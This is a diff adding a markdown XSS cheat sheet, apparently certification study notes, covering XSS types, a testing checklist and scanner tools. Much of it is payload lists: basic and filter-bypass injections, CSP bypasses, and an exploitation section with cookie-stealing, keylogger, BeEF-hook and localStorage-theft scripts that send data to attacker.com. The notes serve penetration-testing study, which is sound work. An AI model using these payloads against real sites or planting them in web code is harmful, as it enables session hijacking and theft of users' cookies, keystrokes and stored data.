@@ -1,0 +1,183 @@
+# Cross-Site Scripting (XSS)
+
+> A client-side injection attack where malicious scripts are injected into trusted websites.
+
+---
+
+## 🔍 Types of XSS
+
+### 1. Reflected XSS
+- Script is reflected off the web server
+- Not stored, only triggered when victim clicks malicious link
+- **Example:**
+```
+https://site.com/search?q=<script>alert(1)</script>
+```
+
+### 2. Stored XSS
+- Malicious script is permanently stored on the server (DB, logs, comments)
+- Every user who visits the page gets attacked
+- **Example:** Comment box, profile bio, username
+
+### 3. DOM-Based XSS
+- Vulnerability exists in client-side JavaScript
+- No server interaction needed
+- **Example:**
+```javascript
+document.innerHTML = location.hash
+```
+
+---
+
+## 🧪 Basic Payloads
+
+```html
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<input autofocus onfocus=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+```
+
+---
+
+## 🚫 Filter Bypass Payloads
+
+```html
+<!-- Case variation -->
+<ScRiPt>alert(1)</ScRiPt>
+
+<!-- No quotes -->
+<img src=x onerror=alert(1)>
+
+<!-- HTML encoding -->
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+<!-- Double encoding -->
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+
+<!-- Null bytes -->
+<scr\x00ipt>alert(1)</scr\x00ipt>
+
+<!-- JS protocol -->
+<a href="javascript:alert(1)">click</a>
+
+<!-- Template literals -->
+<svg><script>alert`1`</script></svg>
+
+<!-- Event handlers without space -->
+<img/src/onerror=alert(1)>
+```
+
+---
+
+## 💀 Advanced / Exploitation Payloads
+
+```javascript
+// Cookie stealing
+<script>document.location='https://attacker.com/?c='+document.cookie</script>
+
+// Keylogger
+<script>document.onkeypress=function(e){fetch('https://attacker.com/?k='+e.key)}</script>
+
+// BeEF hook
+<script src="http://attacker.com:3000/hook.js"></script>
+
+// Redirect
+<script>window.location='https://attacker.com'</script>
+
+// localStorage theft
+<script>fetch('https://attacker.com/?l='+JSON.stringify(localStorage))</script>
+```
+
+---
+
+## 🔎 Finding XSS — Checklist
+
+- [ ] Test all input fields (search, login, register, comments)
+- [ ] Test URL parameters
+- [ ] Test HTTP headers (User-Agent, Referer, X-Forwarded-For)
+- [ ] Test file upload filenames
+- [ ] Test JSON input fields
+- [ ] Check error messages (reflect input?)
+- [ ] Test hidden form fields
+- [ ] Check 404 pages
+
+---
+
+## 🛠️ Tools
+
+| Tool | Use |
+|------|-----|
+| Burp Suite | Intercept & modify requests |
+| XSStrike | Automated XSS detection |
+| dalfox | Fast XSS scanner |
+| OWASP ZAP | Active scanning |
+| Browser DevTools | DOM XSS analysis |
+
+```bash
+# XSStrike
+python3 xsstrike.py -u "https://target.com/search?q=test"
+
+# dalfox
+dalfox url "https://target.com/search?q=test"
+
+# dalfox with pipe
+echo "https://target.com/search?q=test" | dalfox pipe
+```
+
+---
+
+## 🔐 CSP Bypass Techniques
+
+```javascript
+// JSONP endpoint abuse
+<script src="https://target.com/jsonp?callback=alert(1)//"></script>
+
+// Dangling markup
+<img src='https://attacker.com/
+
+// Angular JS sandbox escape
+{{constructor.constructor('alert(1)')()}}
+
+// Base tag hijack
+<base href="https://attacker.com/">
+```
+
+---
+
+## 📋 Context-Based Testing
+
+| Context | Test Payload |
+|---------|-------------|
+| HTML body | `<script>alert(1)</script>` |
+| HTML attribute | `" onmouseover="alert(1)` |
+| JavaScript string | `';alert(1)//` |
+| URL parameter | `javascript:alert(1)` |
+| CSS | `expression(alert(1))` |
+
+---
+
+## 🧠 eWPTXv3 Tips
+
+- Always check for **DOM XSS** in single-page applications (React, Angular, Vue)
+- Look for **postMessage** misuse
+- Check **innerHTML, document.write, eval()** usage in JS
+- Test **SVG files** for XSS
+- Try XSS in **PDF generation** endpoints
+- Check for **mXSS** (mutation XSS) in rich text editors
+
+---
+
+## 📚 References
+
+- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
+- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
+- [HackTricks XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
+
+---
+
+*Notes by [@mtsboy01](https://github.com/mtsboy01) | MTS-SECURITY*
